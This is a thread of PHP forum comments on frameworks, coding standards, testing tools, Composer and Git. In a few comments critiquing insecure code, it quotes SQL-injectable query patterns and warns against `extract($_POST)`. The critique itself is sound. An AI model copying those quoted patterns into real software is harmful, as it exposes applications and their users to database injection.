I would recommend you have a look at adLDAP. http://adldap.sourceforge.net/ I've used it several times for all sorts of AD related stuff and never had an issue.
PHPStorm is what you need, or at least NetBeans. How have you not found this out by Googling "PHP IDE"?
No mention of PSR-0? This looks like a clone of the PHP manual page on namespaces. 
The length of the array isn't known at compile time. How would these loops be unrolled?
As great as it may be, porting a rather large application to 2.0 doesn't seem to be an easy task. I don't know if we will even do it at all, since it is so much change at once.
It sounds like what you need is a good transactional email service. I have integrated [Mandrill App](https://mandrill.com/) before and found it quick and easy to get going. There are others out there as well, [Vertex](http://vertexcommunication.com/) being one. 
i dont like articles that much that dont show how &amp; what was actually measured (code fragments) + skipping ahead and only reading the conclusion didnt help at all - so its not really a conclusion, it doesnt give me the simple TLDR: use for .. dont use for .. etc (and reading the conclusion at least makes it seam theres a simple answer)
Looks excellent. I like that i can send requests as json.
no pokemon? im disappoint
try codeception, its build on phpunit but it can also test behavior
&gt; i dont like articles that much that dont show how &amp; what was actually measured (code fragments) Particularly because a benchmark that fares well on one architecture may not do so well on another. Maybe their code benefits disproportionately from a large processor cache, or bogs down on 64-bit platforms, or so on. If other people can't repeat it to solidify the findings then it's just an interesting anecdote.
I'd consider using it on a new project, but I'm definitely not porting fully working apps. 
Heh, first thing I do is wind up on the Definitive Guide's test page and it says, TDB
They have committed support for 1.1.14 till Dec 2015 at least. That leaves plenty of time to decide between building a v2 app on Yii2 or taking some other route. edit:corrected latest 1.1.x version
I am genuinely curious - why are you "definitely not a fan" ? It is like Yii slips under the radar everywhere. People don't actively bash it but no one is gushing over it like others do over Laravel. What sets Yii apart that it does not take off like Laravel?
It does look a lot different than PHP manual, read the title, it's just a basic how to namespaces, especially for thoses getting familiar with PHP. Your critic does not help in any aspect.
Yii 1 is still sort of old school. It doesn't use composer, etc. It was (apparently, I've never used it) quite good, but lacked the cutting edge features that modern PHP development encourage. Package re-use, composer, namespacing, PSR, testability, etc. It may have some of these things, I forget, but not all. Laravel came out with a very easy way to do a very good framework. It has an entirely reasonable learning curve, and you can make "a thing" very easily. Especially if you cheat and use some of the generators that are available. In the meantime, Yii has consistently failed to meet delivery expectations. If you google for things like "Yii 2 release" you'll find expectations of it hitting either beta or release in November. Last year. Yii 2 has a chance to be a great and well used framework. But it needs to actually come out, and when it does, it needs to hit the pain points Laravel did so effectively. There are a lot of people (I'm one of them) who always wanted to use a framework but are just too thick to get Symfony 2. Laravel scratched an itch in a way Yii has not been able to. And while Yii releases an alpha, Laravel releases 4.1, adding new features and continues to gain users and evangelists. I wish it well when it does come out. More people using frameworks is good. More people using GOOD frameworks is good. I'll probably make a toy application to test it. But I'm not that interested in alpha testing it. I'll make stuff in Laravel until it's ready for prime time.
it's not just me that won't hire you. why don't you want to do things properly? do you not have time? do you believe it's not necessary?
sometime its not, and any company that wont hire someone who does things correct (but not the best possible way) isnt a good company and not one I want to work with/for. if you read my comments about it you can read that in my case its not needed to use install since my packages are always up2date
I work for a very large, well known travel company, and the test engineers here basically have an exact copy of the entire site set up on staging servers and run through a check list of functionality every time there is a release. There are daily releases (bug fixes), and weekly major release (new features) They aren't checking our individual code, they are checking that everyone's code all comes together and plays nicely.
It stands to reason that you will do performance tests on a machine without heavy load - otherwise your results may be off regardless of what timing mechanism you use. I get that using cputime over walltime might make more sense here, but I'd be rather careful with doing microbenchmarks with a profiler. Profilers have the habit of adding non-negligible asymmetric overhead to execution. But I don't know the details of the xhprof implementation, maybe it has non-intrusive profiling modes. (Again: Would be nice to see the code for this...)
It should be pointed out though that languages supporting *high-level* and *zero-overhead* abstractions at the same time are very rare - actually, the only example I can think of right now is C++. Practically all other languages choose one of the two - slow, high-level abstractions (Java^1 , ...) or fast, low-level abstraction (C, ...). ^1 Actually Java is more like slow low-level abstractions ;)
&gt; Yii 1 is still sort of old school. It doesn't use composer, etc. *sigh* 
Sig because I'm right, or wrong? "Sigh" doesn't add anything. 
If you've practiced your problem solving, there's another way: to think of a solution for yourself. Particularly helpful for obscure, unsolved problems.
I wouldn't call people who haven't adopted composer old school, i would call people who use composer almost but not quite a new school.
re #5, it adheres to the "fail fast" security mentality. Rather than doing all that extra work and only *then* figuring out if it's an uploaded file, I'd do that as one of the first things. re #6, still can't hurt :) "Security: Protecting users from themselves since....forever"
[Demo](http://ciconia.kzykhys.com/) available 
&gt; Laravel scratched an itch in a way Yii has not been able to. I actually think it's the other way around, and the fact that I see 10 times as many Yii projects in the wild as Laravel ones, it seems I'm not the only one. Yii is great for CRUD like apps, you can ship those very, very fast. (In a matter of days fast.) Laravel isn't slow to develop with, but with Yii you can have an admin section with a basic RBAC and complete CRUD functionality **under 1 hour**. Plus, Bootstrap can be completely integrated with Gii so it will look pretty as well. The only real downside of Yii IMO is that it's tightly coupled. Laravel is better in this regard. Well, this and the Composer integration. 
No idea how to help, but thanks a ton for the link!
Heh - I found it a really useful script, very simple to set up and implement. Seems to work beautifully except for this little glitch which is almost certainly down to an error on my part. 
Sounds like it might be a cookie problem. Do you have Firefox and Safari configured to be restrictive on the cookies they're accepting?
They're set to allow cookies - although I just checked in Firefox and it doesn't seem to have saved any cookies from the site, even after I logged in. So that's a starting point at least...
It is actually a horrible piece of code, full of SQL injection and other bad practices. You really should not learn stuff from something this terrible.
&gt;prevent SQLite database file from being downloaded and blocked folder access I read one commit comment and lost all faith in the author's security competence. Knowing at any point you could just download the login db is hilarious, let alone a year after it was created. This library should probably be avoided at all costs.
Looking at the php-login/4-full-mvc-framework, it is not full of SQL injection. In fact, I saw no code that would allow it. However, none of the variables were validated before being inserted. The code that uses PDO seems to be alright, but the code that used MySQLi extension was a bit scary to look at. 
The first thing I would try is [session_get_cookie_params()](http://www.php.net/manual/en/function.session-get-cookie-params.php) and verify that the settings are correct for your domain. The default session configurations can be found [here](http://www.php.net/manual/en/session.configuration.php). I've read about quite a few fixes for different browsers: * [P3P Session Problem](http://stackoverflow.com/questions/3393674/php-session-problem-in-safari-opera-and-ie) * [Relative paths not working, absolute paths required for HTTP 1.1](http://stackoverflow.com/questions/5056084/php-session-not-working-in-safari-webkit-nightly) I've also fixed issues in the past by validating that my cookie path ended with a trailing slash and have checked if the cookies were too large and not saving.
Since you are somewhat unaware, let me explain. First versions of PDO was created when MySQL still didn't have any support for server-side prepared statements. Which is why (in spirit of obsessive backwards compatibility fetish, that's so common in PHP) it was opted to by default emulate prepared statements. The emulation of prepared statements ofr MySQL **has to disabled** manually by developer, when PDO object is instantiated. And the author of this abominations is obviously unaware of it. Which means that [this line](https://github.com/panique/php-login/blob/master/4-full-mvc-framework/models/login_model.php#L35) is basically `... WHERE user_name = '{$_POST['user_name']}' ;"` with fancier syntax. Same applies to all of his queries. Also, since PHP 5.3.6, the charset is supposed to be part of DSN. Of course, what would make one even to extend PDO for something like this, is beyond me.
You should try the Slim framework. Helped me organize my code a lot better (and it's not hard to implement a solid login solution with it).
&gt; There are a lot of people (I'm one of them) who always wanted to use a framework but are just too thick to get Symfony 2. Hey I'm curious: what part of Symfony 2 is you don't "get"? :) Have yet to try Laravel, will have to get around to do so soon.
Code has beed added to the post. :)
My experience with Yii so far (1.1.14): Reliable automagic, imposing yet intelligent structure, good performance. Once you get the hang of it, you'll feel like you're getting things done so quickly it's almost unfair. Can't wait to try 2.0
I'm not trying to start any sort of who's framework has the biggest dick competition, just trying to answer the question. That said... :) &gt; I actually think it's the other way around, and the fact that I see 10 times as many Yii projects in the wild as Laravel ones, it seems I'm not the only one. I've seen more Cake projects. Seriously, I don't think this is an argument in favour of Yii's superiority, merely its longevity. The current version of Yii has been out for **five years**. The current version of Laravel has only been out for one, and I think Laravel interest has only really picked up in that period. This is hardly a reasonable comparison. &gt; Yii is great for CRUD like apps, you can ship those very, very fast. (In a matter of days fast.) Laravel isn't slow to develop with, but with Yii you can have an admin section with a basic RBAC and complete CRUD functionality under 1 hour. Plus, Bootstrap can be completely integrated with Gii so it will look pretty as well. There are generators I use for coding Laravel stuff. `php artisan generate:scaffold message --fields="subject:string,content:text"` That will generate the controller for a "message" model, CRUD utility in terms of the forms, edit, save, add, etc, all of the unit testing, the actual Message model, and all the layout. The layout will all use Bootstrap, too, by the way. Laravel projects autoship with a user model, so setting up authentication is pretty trivial. It's not technically an RBAC, because it's not role based, but I'd imagine it could be pretty easily. I'm not saying Yii is bad, but fast deployment of basic CRUD... Laravel's all over that shit. :) 
Honestly, I think that if you haven't adopted Composer, you're flatly doing PHP wrong. And I think that for software that hasn't adopted Composer as an approach to dependency management you're probably out of date, and you've lost my interest.
Just grab a CMS like Joomla/Drupal and read some documentation on how to make certain pages only available to logged-in users.
Since no encoding has been applied, it actual is equivalent. The injection attack is not **as direct** as I portrayed it. But it is still there.
SF2 is not the framework a developer should have used, else they may get lost with all the patterns flying around.
Yeah, especially one without a lot of knowledge about design patterns. :)
you could also use an external SMTP server, [take a look at this](https://www.digitalocean.com/community/articles/how-to-use-gmail-or-yahoo-with-php-mail-function)
I follow PSR-2 standards to the letter. I had to change a few habits doing so, but I feel it's the best way to write code with others. We had issues with everyone going all maverick on the code and the projects looking like ass because of it. 
It actually depends what I'm doing. In my own code I follow PSR-2, because I'm a grown up. In my previous job I followed PSR-1, but PSR-2 wasn't possible to implement because of... well... sheer shitfulness in the codebase. There was no established standard, I just did the best I could. When I do Laravel stuff I do PSR-1 because that's actually what Laravel supports. For what it's worth, I'd recommend using PSR-2 in total. Ignore what you "like" and be ready to work as part of a team/community. That you use two spaces for indenting (seriously?) isn't that relevant. It's not hard to change. I always used tabs myself and still prefer that. But it's not the standard, so I changed. Same with opening brackets. I prefer function myFunction(){ over function myFunction() { But again, I changed because there were more important issues than my personal preference.
I use PSR-0 for file and directory structure. I don't see a strong need to change this, as PSR-4 is fully compatible with PSR-0. I can see how some projects could benefit from the more flexible loader defined in PSR-4, though. I do use PSR-1 and PSR-2, but really my IDE handles most of that for me and it's not a big change from my usual coding style. PSR-3 is just a standard logging interface, and I guess I use it as far as the logging libraries I favor are all compatible.
Personally, I think the FIG standards are a good starting point for any developer or team, and can probably be used without modification. That said, re PSR-2, I use TABs for indentation (argument/index alignment is just 1 more tab), and I always have the opening brace on the same line as the class or method/function declaration. I also always write TRUE, FALSE and NULL in caps. No problems with PSR-1, though I don't follow it strictly all the time. I am using PSR-4 for my most recent project, though I did modify the code to have a "default" lookup that is not attached to a specific namespace. I've never used PSR-3 for anything. Amusingly, on the PHP-FIG site, the right-side menu has two PSR-3 links :) Way to go, folks!
&gt; In my own code I follow PSR-2, because I'm a grown up. Well, now I have coffee in my sinuses. Hope you're happy.
&gt; I use TABs for indentation (argument/index alignment is just 1 more tab) A decent IDE or text editor can automatically convert that for you. I personally never understood the pseudo-religious arguments that cropped up around this, but whatever. &gt; I always have the opening brace on the same line as the class or method/function declaration. Now that I've adjusted to PSR-1/2, a bracket on a new line stands out to me as the beginning of a definition (class, function, etc), while a bracket on the same line means a logical block or flow control. I've carried this over to other languages I use as well. &gt; I also always write TRUE, FALSE and NULL in caps. I hate you.
My favorite interview question to date is, "tabs or spaces?"
Please for the love of all things that are the strides PHP is making currently, do not use extract. If you're stuck in a legacy system at least prefix the newly created variables as such: extract($_POST, EXTR_PREFIX_ALL, 'user_input_'); **TL;DR** Don't do this.
A tracing JIT like luajit's can do it
&gt; I don't want to use PHPUnit. Why? I view those tools as things to build on top of your solid understanding of PHPUnit, not as a replacement for beginners. Is there something particular you dislike about PHPUnit?
[See here](http://www.php.net/manual/en/function.print.php#85310).
Aha! Thanks.
Store it there for later!
Hi, a few notes from Codeception author: * Codeception is quite unique framework, its DSL is much more similar to BDD scenarios written in Gherkin, but still is a PHP code. * Do you really need Gherkin? I mean, is that a requirement of your management/client? If only technical team is expected to work with tests, then probably you will be comfortable with plain PHP. * I know there are lots of companies that use Codeception in their projects. I didn't collect a complete list of them, just a few are here: https://github.com/Codeception/Codeception/wiki/Who-is-using-it%3F * Using one tool for testing is great. You can get a single test execution report, complete code coverage report, and keep acceptance/functional/unit tests in one place. * Codeception has lots of features included. Not sure for your actual needs, but you should consider looking through the list of its modules. They are very flexible and they have 95% of all required steps for different cases.
A horribly written article on how to recreate security holes from 1995? Top job. 
Perfect example of why PHP is bashed on.... The community has so many novice programmers, this comment screams novice.
Real programmers use butterflies. 
Okay, for this weekend only (couple hundred lines of code, probably), I'll put my opening braces on a new line, and keep true, false and null in lowercase. Just to see how it goes and so you don't hate me :) You will have to tear by TABs from my cold, dead hands, though.
I really like codeception for driving acceptance tests. It's really made the difference between having a usable test infrastructure and not.
I was like you once. I spent hours figuring out how to install PHPUnit, because I knew it was worth it. Then sometime later they released the [phar](https://phar.phpunit.de/phpunit.phar) version and I cried myself to sleep.
Am still learning flat php - I'm a bit scared of frameworks because it feels like learning a whole new language, but I guess I just need to take the plunge.
For the lazy if((print "foo") &amp;&amp; (print "bar")) { // "foo" and "bar" had been printed } instead of: if(print("foo") &amp;&amp; print("bar")) { // unacceptable output }
Reading articles like this really helps me have the confidence to sell PHP to senior management teams. I believe PHP is now, more than ever, a language with a bright long lasting future ahead of it, despite some of the warts. I also think we as PHP developers really need to appreciate the work, organisation, and contribution Facebook as a company are making to PHP. They didn't need to share this work with the world, or make it so amazingly compatible with code bases which weren't there own, but they have, and they are making the world a better place for doing so. If anyone who is involved in the HHVM project reads this, here's a quick thank you from me!
You're worrying about way more than you need to. You don't need to know anything about building a server or using vi, and composer runs with one command and reads a file you can edit and upload. [Composer](http://getcomposer.org) is the php package manager, like gem is to ruby. It enables you to take certain parts of apps and put them all together in your app saving you from having to write the code yourself. For example if you want somebody to be able to use Facebook to login to your site you might use [HybridAuth](http://hybridauth.sourceforge.net) rather than wrestling with the API and writing it yourself. That being said, the only command line access you need is to run composer, a lot of shared hosts will provide SSH access to your directory then its as simple as navigating to the directory laravel is in and running `php composer.phar update`. All the editing of files etc can still be done as you normally would and uploaded via FTP. You need to check two things with your host: * Can I get SSH access to my directory * Can I point the webserver to my 'public' directory rather than my root directory. Your best and easiest option would be to look for [hosts who specifically provide hosting for laravel](https://www.google.com.au/search?q=laravel+hosting&amp;oq=laravel+hosting&amp;aqs=chrome..69i57j69i65l2j0l3&amp;client=ms-android-google&amp;sourceid=chrome-mobile&amp;espv=1&amp;ie=UTF-8).
Wasn't the article I was expecting - quite a fun read. :)
Can't tell if trolling, or...
I started using and love it. Love how it generates test templates via CLI. just wish there was a unified test managment plugin where I can specify tests to be run with in different environments. 
Please don't delete this question. I'm writing a really long response, and I htink this is a really important question.
I feel better already - thanks!
I was serious, but attempting to do it a humorous way. The point is that there is indeed a "single, easy-to-use executable" version of phpunit - the phar version I linked: https://phar.phpunit.de/phpunit.phar
It's very late, and I'm very tired, but I just got out of a really comfortable, freshly made bed in a very nice hotel room in order to respond to this question, so passionate is my will to talk about this. I got out of bed, got my laptop and went straight back into bed with it, btw. I'm not a fanatic. The reason I want to reply is **you are me**. You're exactly where I was about 8 months ago. You're trying to make exactly the same decisions I was, for exactly the same reasons, and running into exactly the same problems. So think of this as a message as a message from *your future self*, and take heed. Like you (because I am you), I am very stupid. Command lines are hard. They're hard to remember, and they're hard to use. Geeks love them because they're "powerful". Cool people like us find them confusing and stupid, and have avoided using them for ages. The world you're looking at is not Laravel. That's just one part. Long story short, the world has gone and changed itself on you. The ecosystem is not what it was a few years ago. There are new expectations. The mistake we made wasn't that we didn't learn Composer, or any one tool. It's that we rested on our laurels. We got comfortable with a workflow, a toolkit that "does the job". I'm actually in the process of writing an article about this now, but the point of it is that developers are like salmon. We have to keep swimming, leaping up the channel of our careers. Because when we think we're able to stop, we're actually getting washed backwards. Also we might be eaten by a bear. Also, if we succeed, we jizz once and then die. Actually, this is a shit metaphor. But you get my point. What we think is us being static, and maybe "not bothering with all that new stuff that doesn't seem to do much anyway" is actually our skills and career stagnating. What makes that obvious is how much dumb shit you have to do to get it all working. All the questions you are asking yourself now I've had to ask not long ago as well. Because it wasn't just "Laravel". It was Laravel, Composer, Git, PaaS hosting, new server software, Node JS installation, Apache configs, PHP updates... Because I let my skills stagnate to a point, where upgrades weren't viable. I'm not sure how much into PC hardware, but think of it like when you build PCs. If you do it yourself. If not... sorry, bear with me and just ride this out. When you build a PC, you go to upgrade it. Put more RAM in. No problem. Maybe upgrade it to a faster processor. Cool. But if you let things go to long you find that upgrading the processor actually requires a new motherboard because the socket has been updated. And the RAM you have won't work with that new motherboard.... And it won't fit properly in the case. Because it reached a point where your stuff is just all too out of date to try and slot one new thing in. It's become fragile and irrelevant. You don't want your skillset to do this. The problem is that it has. You've got a solid core of skills, absolutely. But your tool kit, your approach, has gone out of date, and getting it current requires a rebuild. So let's start with the basics. **Server** &gt; Am I out of my league here? I have deep reservations about my ability to build my own sever that doesn't suck, so I don't want to do that. You don't need to build a server. You just need to install one. I have a mac laptop that I do all my development on, and I highly recommend them as an environment because it's Unix based. But they have friendly clicky buttons and nice apps for duffers like us. They more closely match production environments, instructions tend to be written for them, and command-line stuff tends to just... actually work. Windows is more fiddley, and you often have to figure out why things aren't working. If you do just have windows, certainly don't buy a mac on my recommendation. It's perfectly usable, just has some... special features. You need to download something like Xampp (Windows) or MAMP (for Mac). That will install PHP, Apache, Mysql, etc. All the shit you need. They're not hard to set up, but I don't want to go into it too much. What you need to do is make sure you have the **latest** version of PHP. I went to use Composer and found that my PHP version was too old, meaning I needed a new one, but there wasn't one available, so I needed a new lamp stack and it didn't work properly so... down the rabbit hole I went. **Next step. Git.** I'm going to be brutally honest here. I apologise in advance. Version control is not optional. It is mandatory. If you want to do this professionally, you must choose whether to use version control, or please quit the industry. Seriously. I'm going to assume you're still here. Version control is necessary. There are two real contenders. Git and SVN. SVN is easier to explain (even I learned it!) but Git is definitely where it's at. Using something like Github or Bitbucket (I recommend the latter for increased freeness) makes things a lot easier. You can get a nice client that is not really any different to FTP, but far, far more useful. Understanding Git is also beyond the scope of this document. Honestly, if you have a mac a lot of this stuff is trivial because Git is already built in. If not, it's a quick install, google some instructions and you're golden.
 **Composer** Yep, you need to install composer. Have you done so? It's a bit weird to figure out, but basically... no, composer is NOT a command line utility. I mean, it can be, but it really doesn't need to be. When I first started... composing... I was using it commandline, but now there's just no need. It's worth pointing out that you should know what Composer actually **does** so you know why you need it. Composer is a dependency management system. Which is a fancy way of saying it handles all the code you **didn't** write. Or what I like to call "all the code that isn't complete shit". That could be any number of things. Maybe you use a date formatting class. You just let composer handle it. Then you don't have to worry about any includes. Just put it in a file and run a single command line, and it's installed. Maybe it's more than a single class. Maybe it's a bunch of libraries. Some testing utilities. An ORM. A whole framework. Composer will handle it all. And all of the includes that are needed to make it work? Composer will handle them all. You just include one file, and the rest is done by wizardry. There's a reason we installed Git before. Composer actually uses Git to get its stuff. See how all of this stuff is connected? It gets more connected as you go. **Laravel** If you get the above working, Laravel becomes trivial. You've probably seen [this page](http://laravel.com/docs/quick) previously, but what it says is dead on. Run the windows installer at that link, then in a command line go to your web root and type: composer create-project laravel/laravel quadtofodderlaravel1 --prefer-dist That should actually make a whole new directory, and fill it up with laravel shit. I'm going to go back to your questions now, because they cover a lot of things that I think are relevant. &gt; Can a man such as myself get Laravel up and hello-world-ing in less that 5 hours? No. I mean, you could, but there's so much ground to cover and so much core stuff you need to get working, there's every chance of getting stuck with *something* not working. Maybe you can't get the composer command to work properly. Maybe you have trouble installing xampp. I don't know. The problem is that in the past, you, like me, have hit problems and just gone "Fuck it, not worth it." You're wrong. It's absolutely worth it, and you **need** to do it. If all goes according to plan you can absolutely have a Laravel working within 5 hours. If it doesn't, then it's an open question how long it will take. But this is a first time pain. You have to go through it to build a knowledge base and platform for each subsequent time. &gt; I can't work vi. Good. You're a better person for it. Fuck the haters. There are plenty of tools to use. I recommend Sublime Text. Barebones, fast, effective. Most people living in Laravel-land are using it. &gt; I don't know my way around the command line. Totally fine. You don't need to use them. I found that initially I used GUIs for most things. Particularly Git. I needed the visual of how things were working. But after a while, I became more comfortable with what I was doing and started to prefer using the command line. You might well be the same. &gt; Am I overestimating the complexity of this install? Am I missing some simpler options that are out there? No, you're trying to do things **the right way**. This is a very good thing. It's the right choice, but not the easy choice. &gt; Will my beloved phpmyadmin and GUI FTP client still be my friend? No. They are not your friend. They are your enemy. They are the old "buddy" that used to do meth with you, and makes you feel bad because maybe you should just do meth that one more time. Just once. If you use FTP you are fundamentally doing it wrong. There are better options, specifically in deploying from Git. phpMySQL is shit. It always has been. It's just always been *there*. But there are much better options, one of which is to use a much more efficient gui client. On Mac I use Sequel Pro, there's also HeidiSQL on Windows. They're so much better than PHPMyadmin, whose ubiquity was its only real feature. &gt; Can I do this on my [unmentionable] shared hosting? How would I know? If you have SSH access, then probably yes. But you may run into limitations in terms of PHP support, access levels, etc. &gt; Is there something between [travelfather] and rackspace I should look at?? Rackspace is terrible and that other place **should not be used for anything ever**. Do not support them. Look into PaaS. Platform as a service. What this means is that instead of "a server" you have a sort of environment there, ready to make stuff go. They're totally dedicated to PHP, and fully support all the latest shit (git, composer, etc). The one I use, for example, is FortRabbit. From the command line I can just go `git commit -m "Changed that file"` and then run `git push fortrabbit master` and it will update on the site, live. No need for FTP. All magical. (Note that you could do exactly the same with a Git GUI. You don't need to use a commandline.) &gt; If this is too stupid, just flame me and I'll politely delete this topic. Please don't delete this. I've been writing a REALLY long time, and I think this is probably something that people need to read. Remember, I am you from a future time. I know what I'm talking about. Also, seriously, don't buy Bitcoins. They're not going to go up, and people are going to look really fucking stupid in about a month and a half. Trust me on this.
Or put it in your composer package and then it's just `php vendor/bin/phpunit`
yep. I hope we improved Codeception in last year. Dependnig on module you choose the stability may differ, but the most popular modules like WebDriver, PhpBrowser, REST are well tested and widely used.
It's worth noting that Codeception is built on PHPUnit, and you can run PHPUnit tests in Codeception if you want to.
Okay, it was not only just issues with the codeception code itself but sometimes just packaging issues (missing libraries in the phar, ...).
hhvm has the potential to be a complete game changer. The internals are so much better done than the Zend stack. Given that it's a persistent long running multi-threaded server app, possibilities open up to do real server work in PHP itself. And given the JIT compiler is as fast as it is, my understanding is that some of the PHP extensions themselves can (or will be able to) be written in PHP. Interesting times for the language.
Upvotes all round! I found this thread really helpful and informative as a programming noob who's just figuring out where to go next now that I've learned the basics of PHP.
You described me 1.5 years ago. Right click a php file (server) with FileZilla, "Edit with Notepad++", make changes, press save, go back to Filezilla and click "Yes to override", go to browser, press F5, check if it throws an error. Make daily backups, name them as "last backup", "newer backup" etc. I was good at using PHP to develop things but I was awful on everything else. How I made the highest jump in my career? Well, I wanted to use a realtime FTP feature inside Notepad++ so I could save some time by taking it to the project area and do changes directly in browser. Someone in Reddit suggested me to learn Git. He said, "It's really easy, I teached that to my coworkers in 2 hours and they're really happy about it." Decided to give it a try. In around 2 hours, I had my repository on Bitbucket and I got the basics of Git. You know what? I looked past and told myself: "Why didn't I learn it before???" I realized I was really behind in terms of development. If I had a fulltime job and someone see me working over FileZilla/Notepad++ and editing production directly, I would probably be laughed or even lose my job. After I learn Git, enthusiasm started. I told myself: "Look, do yourself a favor and get out of your comfort zone. Try new things and don't stop until you can write articles about modern software development. Stop developing PHP in an ancient way. Work on engineering. Make your code and workflow look like an art. Any more delay you do is only going to hurt yourself." So, I learned Git. Then, I had to increase my terminal skills and the look of my terminal also. I enhanced my terminal, created my aliases. Then, I threw Notepad++ out of window, installed Sublime Text 2 and got like 15 helpful plugins. Then, I decided to throw my ancient framework and use something modern, like Laravel. Laravel is incredibly good and it usually makes me "Woah, dude you can't be serious, this is pure engineering." However, when I used modern techniques like composer to install it, there I learned the importance of package managers. "composer update" and bam! Everything updates. So I started using other package managers like NPM/Gem and installed helpful toys. Eventually, I decided to use Vagrant. Isolated my dev and personal environment. After a while, I used Puphpet to provision my vagrant. It continued with GruntJS. In a single day, I developed my Gruntfile script and automated most of the boring tasks. I wanted to keep getting better. I threw my shared hosting out of window and uninstalled Filezilla right away. Learned PaaS services like Appfog/Fortrabbit where you can do deployment and management via SSH. Eventually, I came across the techniques of TDD. I'm not very experienced on TDD yet but I know the concept. Wrote some tests, used a service like Travis for CI purposes. Not only I became a developer who can talk about anything, but my code quality has been increased drastically too. I wanted to toy with other languages. Learned the basics of Ruby, decided to learn Rails the next day. It felt like I was learning Laravel. I could develop an application my eyes closed but I decided to stick with Laravel for my projects and work on Ruby just for hobby apps. It followed NodeJS, then Bootstrap 3, then AngularJS. The more I look at past, the more enthusiasm I gain. I could read articles all day long. I could download e-books and read 150-200 page in a single day. In my opinion, the key to get better is always getting out of your comfort zone and take new challenges. Things may look confusing at first, but fully focus on it and work on it like 2-3 hours, it will make sense. I've always thought who used Vagrant were geniuses because when I first installed Vagrant and did vagrant up, nothing was happening. I was looking at the black terminal and had no idea what to do so I thought "This is not for me, I'm sure." After 2-3 months, I decided to try again and I realized I can do SSH connections to it. Did "ls" on vagrant and I saw linux folders. I blamed myself because I was a dumb to give up too quick. I could read one more paragraph and get it to work! Same goes for Laravel, same goes for Grunt, same goes for everything. So, don't stop learning Laravel because you're scared or composer or doing some terminal commands. You don't need to do anything on terminal. Change to project directory and do "composer install" - that's all. With that said, I'm the worst terminal guy on earth. I'm on a windows environment and never had experience with terminal before I met with Laravel. I still suck at it. I know only a few commands like ls, cd, dir. (I can't even count a 4th, seriously.) If I could do it, anyone can. I'm not going to stop learning. I know I'll be a dead developer when I say "Ok, I have enough knowledge. I can rest now." No. Keep learning. PHP is having it's renaissance. Be a part of it. Useful tools and useful information pop up everyday. Read anything you can. I never written a single line of Java code in my entire life but I fucking know how they code, what tools they're using and what their workflow looks like. Lastly, you're not idiot and you will definitely success, because you making this topic already states you're willing to learn. If you need help, hit me up. I learnt alot from redditors by spamming their private messages. Ps. Don't let my username scare you. :p 
 [phpacademy](http://www.youtube.com/user/phpacademy) has some nice video tutorials. Just a side note, make sure that you always learn from the latest tutorial, because lot of the stuff on the internet is obsolete and not safe and using those can get your site hacked.
Why not use a VM instead?
&gt; Am I out of my league here? Sadly, yes.
http://www.phptherightway.com/ As someone new to the language, it's going to be *completely* over your head, but please give it a read anyway. I don't have any other specific resource recommendations for you, but [there are guidelines on how to pick high-quality ones](http://www.reddit.com/r/PHP/comments/1qsupd/im_new_to_php_what_are_some_bad_practices_i/cdg87qf).
This is a question that is better asked here and NOT on Google. A huge number of PHP tutorials teach dangerous use of PHP. Unfortunately these tutorials seem to congregate at the top of the Google search results. Using your link as an example, the very first result does this on several occasions: $query = mysql_query("SELECT first_name, last_name FROM People WHERE id = " . $inAuthorId) Dear OP, I don't have a good recommendation for a specific tutorial, however I can offer a piece of advice. When looking for PHP guides, if you see any function beginning with "mysql_" used in it, immediately close the page and disregard everything you read. You can bet that it will be trying to teach dangerous, outdated, and/or probably outright wrong ideas about using PHP.
&gt; They are the old "buddy" that used to do meth with you, and makes you feel bad because maybe you should just do meth that one more time. Just once. Blaah ha ha! Fantastic! Fantastic post in general. Thanks a billion +1.
I found the following book on Git extremely helpful when learning. http://shop.oreilly.com/product/0636920022862.do Edit: 2 alternatives to Rackspace are http://fortrabbit.com/ and https://www.digitalocean.com/
You assigned `$b` to `$b-&gt;a`. Assuming that is a typo... The example given on Stack Overflow is not the same as what you've used here. I imagine there is an order of operations problem with `$b-&gt;a::VALUE;`
Yes, that was a typo, and I've fixed the example. The example in the answer is different, but that's not what I'm focusing on. I'm focusing on that he said the askers syntax (what I'm using in the example above) should work on PHP 5.3 and up.
Most of configuration data is no longer stored in php.ini, even the default installations extend php.ini using conf.d format where you store additional configuration overrides. Also some of those settings are only ideal if you are running a single web site. Edit: I see that the first point was addressed in the linked post, if author is aware of this why not modify the tool to work with such installs? It's pretty much a standard.
For such a bad developer you tell an inspiring tale. I will in fact hit you up should the need arise. Thanks!
Try [CodeAcademy](http://codeacademy.com)!
Yeah that's actually a better approach than scanning .ini file, especially if you are not going to pick up overrides.
It looks like this is an issue with b not having the scope to access a constant property in a. http://php.net/manual/en/language.oop5.paamayim-nekudotayim.php Can't seem to find a definitive answer on this, or similar questions. I would say having a get method in Test would be the work around. 
The poster uses `$this-&gt;model::STATE_PROCESSING` and the responder says "Seems like your on an older version of php? PHP 5.3 allows the access of constants in the manner you describe." which reads to me that 5.3 and up should allow `$this-&gt;model::STATE_PROCESSING` which is the exact same as `$b-&gt;a::VALUE`. &gt; What's the scenario where you know the name of the constant, but not the name of the class defining the constant? If an instance might override the value of a constant inherited from a parent. For example: &lt;?php class WaterPipe { const MAXIMUM_GALLONS_PER_SECOND = 10; } class BigWaterPipe extends WaterPipe { const MAXIMUM_GALLONS_PER_SECOND = 100; } In this case, I want to use an instance's specific constant by doing `$instance::MAXIMUM_GALLONS_PER_SECOND`. EDIT: In any case, I've edited my original post. I'm just going to assign the object to a temporary variable first.
Wow. Nice post. On top of this, I suggest using Vagrant + VirtualBox for building an almost exact copy of your production environment vs using (W|M)AMP.
Absolutely do it. I was in your shoes 6 months ago. Laravel is fun, refreshing and incredibly easy to use. I will be using it for a long time.
Yes, a local *AMP stack can contain rabbit holes at every level. Just let https://puphpet.com/ generate the stack for you. The last thing you want to be doing is wondering why your local dev stack is broken.
The only way you're not out of your league is if you decide you want passionately to learn everything necessary. If that doesn't sound fun, then no, I don't think you're gonna make it.
It's better because you can literally build an exact replica of your production environment on your local computer... I doubt you use OS X Server or Windows Server on your production server, do you? Then that alone is a huge problem. You'll be picking and scratching your head wondering why it works locally but not on the prod server. Vagrant + VirtualBox is essentially a VPS ON your machine. Using your flavor of Linux, PHP, Etc... It also helps if you have to pull in a clients project and they have special conditions with their code, you can setup a VM using their specifications and it doesn't interfere with any other projects you're working on.. Done with a project? `vagrant destroy` and that girl is donezo.
